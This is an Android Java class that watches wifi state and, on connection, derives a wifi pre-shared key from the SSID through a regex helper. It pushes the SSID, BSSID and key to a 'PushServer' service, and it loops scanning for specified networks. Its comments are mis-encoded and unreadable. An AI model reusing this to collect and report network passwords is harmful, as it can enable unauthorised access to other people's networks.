 package jiunling.pass.wifi;
 
 import static jiunling.pass.config.option.SleepTime;
 import static jiunling.pass.push.PushService.RegisterWifi;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.wifi.WifiManager;
 import android.util.Log;
 
 public class WifiReceiver {
 
 	/***	Debugging	***/
 	private static final String TAG = "WifiReceiver";
 	private static final boolean D = true;
 	
 	private Context mContext;
 					
 	/**		bswifiAonReceive|A]nLiJAҥH]wNetWordstatus	**/
 	private boolean isWifi = true;
 	private boolean isNotNetWork = false;
 	private boolean NetWorkstatus = isNotNetWork;
 	
 	private int wifi_state = -1;
 	
 	private Environment mEnvironment;
 		
 	public BroadcastReceiver mWifiReceiver = new BroadcastReceiver() {
 		@Override
 		public void onReceive(Context context, Intent intent) {
 			String action = intent.getAction();
 			if (action.equals(ConnectivityManager.CONNECTIVITY_ACTION)) {
 				/***	ܮɷ|iJo		***/
 				if(D) Log.e(TAG, "-- onReceive CONNECTIVITY_ACTION --");
 				NetworkStatus();
 			} else if (action.equals(WifiManager.WIFI_STATE_CHANGED_ACTION)) {
 				/***	wifi}ɷ|iJo		***/
 				wifi_state = intent.getIntExtra("wifi_state", 0); 
 		        switch (wifi_state) { 
 		        case WifiManager.WIFI_STATE_DISABLING: 
 		        	if(D) Log.e(TAG, "WIFI_STATE_DISABLING");  
 		        	break; 
 		        case WifiManager.WIFI_STATE_DISABLED: 
 		        	if(D) Log.e(TAG, "WIFI_STATE_DISABLED"); 
 		        	break; 
 		        case WifiManager.WIFI_STATE_ENABLING: 
 		        	if(D) Log.e(TAG, "-- WIFI_STATE_ENABLING --"); 
 		        	break; 
 		        case WifiManager.WIFI_STATE_ENABLED: 
 		        	if(D) Log.e(TAG, "-- WIFI_STATE_ENABLED --"); 
 		        	break; 
 		        case WifiManager.WIFI_STATE_UNKNOWN: 
 		        	if(D) Log.e(TAG, "WIFI_STATE_UNKNOWN"); 
 		        	break; 
 		        } 
 			}
 		} 
 	};
     
 	public WifiReceiver(Context mContext) {
 		this.mContext = mContext;
 
 		/***	Start Receiver	***/
 		EnableReceiver();
 		
 		mEnvironment = new Environment(mContext);
 	}
 			
 	private void EnableReceiver() {		
 		if(D) Log.e(TAG, "-- EnableReceiver --");
 		
 		/***	ť		***/
     	IntentFilter mIntentFilter = new IntentFilter(); 
     	mIntentFilter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);		/*** 		WIFI Status			***/
     	mIntentFilter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);	/*** 	(WIFI/3G) connect		***/
     	
     	mContext.registerReceiver(mWifiReceiver, mIntentFilter); 
 	}
 
 	public void DisableReceiver() {
 		mContext.unregisterReceiver(mWifiReceiver);
 	}
 		
 	/**		ˬdA(WIFI or 3G)	**/
 	private void NetworkStatus(){
 		ConnectivityManager mConnectivityManager = (ConnectivityManager) mContext.getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
 		NetworkInfo info = mConnectivityManager.getActiveNetworkInfo();  
 	    if(info != null && info.isAvailable()) {
 	        String name = info.getTypeName();
 	        if(D) Log.e(TAG, "now Network "+name);
 	        if(name.equals("WIFI")) {
 	        	NetWorkstatus = isWifi;
 	        	ConnectedWifiPasswd();
 	        } else {
 	        	NetWorkstatus = isNotNetWork;
 	        	StartCheckWifi();
 	        }
 	    } else {
 	    	if(D) Log.e(TAG, "no Network");
 	    }
 	}
 	
 	private void ConnectedWifiPasswd() {
 		WifiHelper mWifiHelper = new WifiHelper(mContext);
 		RegexNetwork mRegexNetwork = new RegexNetwork();
 		mRegexNetwork.getNetwork(mWifiHelper.getSSID());
 		
		if(mRegexNetwork.verify()) Push(mWifiHelper.getSSID(), mWifiHelper.getBSSID(), mRegexNetwork.getPSk());
 	}
 	
 	private void Push(String SSID, String MAC, String psk) {
 		String []Parameter = new String[3];
 		
 		Parameter[0] = SSID;
 		Parameter[1] = MAC;
 		Parameter[2] = psk;
 
 		Intent mIntent = new Intent("PushServer");
 	    mIntent.putExtra("Kind", RegisterWifi);
 	    mIntent.putExtra("Parameter", Parameter);
 	    mContext.sendBroadcast(mIntent);
 		
 	}
 	
 	private void StartCheckWifi() {
 		if(wifi_state == WifiManager.WIFI_STATE_ENABLED) {
 			new Thread() {  
 	            @Override  
 	            public void run() {  
 	                super.run();  
 	                while(!NetWorkstatus) {
 	                	if(D) Log.e(TAG, "NetWorkstatus: "+NetWorkstatus);
 	                	try {  
 	                		mEnvironment.ScanHaveSpecifiedWifi();
 	                		Thread.sleep( SleepTime );
 	    				} catch (InterruptedException e) {
 	    					// TODO Auto-generated catch block
 	    					e.printStackTrace();
 	    				}
 	                }
 	            }  
 	        }.start();
 		}
 	}
 }
